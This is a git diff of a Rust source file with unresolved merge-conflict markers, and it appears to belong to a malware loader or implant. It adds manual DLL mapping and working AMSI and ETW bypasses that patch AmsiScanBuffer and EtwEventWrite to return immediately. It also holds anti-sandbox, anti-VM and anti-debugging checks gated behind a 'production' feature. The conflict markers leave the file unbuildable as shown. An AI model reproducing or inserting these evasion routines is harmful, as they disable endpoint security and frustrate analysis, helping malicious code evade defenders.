@@ -122,24 +122,50 @@ pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
     }
 
     // 4. Copy headers
+<<<<<<< HEAD
     ptr::copy_nonoverlapping(dll_bytes.as_ptr(), base_addr as *mut u8, headers_size);
 
     // 5. Copy sections
     let section_header_offset = nt_headers_offset + mem::size_of::<IMAGE_NT_HEADERS>()
+=======
+    ptr::copy_nonoverlapping(
+        dll_bytes.as_ptr(),
+        base_addr as *mut u8,
+        headers_size,
+    );
+
+    // 5. Copy sections
+    let section_header_offset = nt_headers_offset
+        + mem::size_of::<IMAGE_NT_HEADERS>()
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         - mem::size_of::<IMAGE_OPTIONAL_HEADER>()
         + nt_headers.file_header.size_of_optional_header as usize;
 
     for i in 0..nt_headers.file_header.number_of_sections {
+<<<<<<< HEAD
         let section = &*(dll_bytes
             .as_ptr()
             .add(section_header_offset + i as usize * mem::size_of::<IMAGE_SECTION_HEADER>())
             as *const IMAGE_SECTION_HEADER);
+=======
+        let section = &*(dll_bytes.as_ptr().add(
+            section_header_offset + i as usize * mem::size_of::<IMAGE_SECTION_HEADER>()
+        ) as *const IMAGE_SECTION_HEADER);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         if section.size_of_raw_data > 0 {
             let dest = (base_addr as usize + section.virtual_address as usize) as *mut u8;
             let src = dll_bytes.as_ptr().add(section.pointer_to_raw_data as usize);
 
+<<<<<<< HEAD
             ptr::copy_nonoverlapping(src, dest, section.size_of_raw_data as usize);
+=======
+            ptr::copy_nonoverlapping(
+                src,
+                dest,
+                section.size_of_raw_data as usize,
+            );
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         }
     }
 
@@ -159,23 +185,35 @@ pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
 #[cfg(target_os = "windows")]
 pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<LPVOID> {
     let dos_header = &*(base_addr as *const IMAGE_DOS_HEADER);
+<<<<<<< HEAD
     let nt_headers =
         &*((base_addr as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS);
+=======
+    let nt_headers = &*((base_addr as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Obtener export directory RVA (está en DataDirectory[0])
     let export_dir_rva_ptr = (base_addr as usize
         + dos_header.e_lfanew as usize
         + mem::size_of::<u32>()  // Signature
         + mem::size_of::<IMAGE_FILE_HEADER>()
+<<<<<<< HEAD
         + 96) as *const u32; // Offset to DataDirectory[0].VirtualAddress
+=======
+        + 96) as *const u32;  // Offset to DataDirectory[0].VirtualAddress
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     let export_dir_rva = *export_dir_rva_ptr;
     if export_dir_rva == 0 {
         return None;
     }
 
+<<<<<<< HEAD
     let export_dir =
         &*((base_addr as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
+=======
+    let export_dir = &*((base_addr as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     let names_rva = export_dir.address_of_names;
     let functions_rva = export_dir.address_of_functions;
@@ -212,6 +250,111 @@ pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<L
     None
 }
 
+<<<<<<< HEAD
+=======
+/// AMSI bypass (patch AmsiScanBuffer)
+#[cfg(target_os = "windows")]
+pub unsafe fn bypass_amsi() -> bool {
+    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
+
+    let amsi_dll = b"amsi.dll\0";
+    let h_amsi = LoadLibraryA(amsi_dll.as_ptr() as *const i8);
+    if h_amsi.is_null() {
+        return false;
+    }
+
+    let scan_buffer = b"AmsiScanBuffer\0";
+    let p_amsi_scan = GetProcAddress(h_amsi, scan_buffer.as_ptr() as *const i8);
+    if p_amsi_scan.is_null() {
+        return false;
+    }
+
+    // Patch: xor eax, eax; ret
+    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
+    let mut old_protect: DWORD = 0;
+
+    if VirtualProtect(
+        p_amsi_scan as LPVOID,
+        patch.len(),
+        PAGE_EXECUTE_READWRITE,
+        &mut old_protect,
+    ) == 0 {
+        return false;
+    }
+
+    ptr::copy_nonoverlapping(
+        patch.as_ptr(),
+        p_amsi_scan as *mut u8,
+        patch.len(),
+    );
+
+    VirtualProtect(
+        p_amsi_scan as LPVOID,
+        patch.len(),
+        old_protect,
+        &mut old_protect,
+    );
+
+    true
+}
+
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn bypass_amsi() -> bool {
+    false
+}
+
+/// ETW bypass (patch EtwEventWrite)
+#[cfg(target_os = "windows")]
+pub unsafe fn bypass_etw() -> bool {
+    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
+
+    let ntdll = b"ntdll.dll\0";
+    let h_ntdll = LoadLibraryA(ntdll.as_ptr() as *const i8);
+    if h_ntdll.is_null() {
+        return false;
+    }
+
+    let etw_event_write = b"EtwEventWrite\0";
+    let p_etw = GetProcAddress(h_ntdll, etw_event_write.as_ptr() as *const i8);
+    if p_etw.is_null() {
+        return false;
+    }
+
+    // Patch: xor eax, eax; ret
+    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
+    let mut old_protect: DWORD = 0;
+
+    if VirtualProtect(
+        p_etw as LPVOID,
+        patch.len(),
+        PAGE_EXECUTE_READWRITE,
+        &mut old_protect,
+    ) == 0 {
+        return false;
+    }
+
+    ptr::copy_nonoverlapping(
+        patch.as_ptr(),
+        p_etw as *mut u8,
+        patch.len(),
+    );
+
+    VirtualProtect(
+        p_etw as LPVOID,
+        patch.len(),
+        old_protect,
+        &mut old_protect,
+    );
+
+    true
+}
+
+#[cfg(not(target_os = "windows"))]
+pub unsafe fn bypass_etw() -> bool {
+    false
+}
+
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 // ============================================================================
 // Anti-Sandbox and Anti-Analysis Features
 // ============================================================================
@@ -313,7 +456,13 @@ fn check_vm_registry_keys() -> bool {
 
     // Check VMware keys
     for key in &vmware_keys {
+<<<<<<< HEAD
         let output = Command::new("reg").args(&["query", key]).output();
+=======
+        let output = Command::new("reg")
+            .args(&["query", key])
+            .output();
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         if let Ok(out) = output {
             if out.status.success() {
@@ -324,7 +473,13 @@ fn check_vm_registry_keys() -> bool {
 
     // Check VirtualBox keys
     for key in &vbox_keys {
+<<<<<<< HEAD
         let output = Command::new("reg").args(&["query", key]).output();
+=======
+        let output = Command::new("reg")
+            .args(&["query", key])
+            .output();
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         if let Ok(out) = output {
             if out.status.success() {
@@ -366,7 +521,12 @@ fn check_vm_files() -> bool {
 fn check_vm_mac_address() -> bool {
     use std::process::Command;
 
+<<<<<<< HEAD
     let output = Command::new("getmac").output();
+=======
+    let output = Command::new("getmac")
+        .output();
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if let Ok(out) = output {
         let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
@@ -396,7 +556,10 @@ fn check_vm_mac_address() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn detect_sandbox_artifacts() -> bool {
     use std::path::Path;
+<<<<<<< HEAD
     use std::process::Command;
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Check 1: Known sandbox process names
     if check_sandbox_processes() {
@@ -430,7 +593,12 @@ fn detect_sandbox_artifacts() -> bool {
 fn check_sandbox_processes() -> bool {
     use std::process::Command;
 
+<<<<<<< HEAD
     let output = Command::new("tasklist").output();
+=======
+    let output = Command::new("tasklist")
+        .output();
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if let Ok(out) = output {
         let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
@@ -638,7 +806,10 @@ unsafe fn check_peb_being_debugged() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 pub fn detect_time_acceleration() -> bool {
     use std::thread;
+<<<<<<< HEAD
     use std::time::{Duration, Instant};
+=======
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     let start = Instant::now();
     thread::sleep(Duration::from_secs(1));
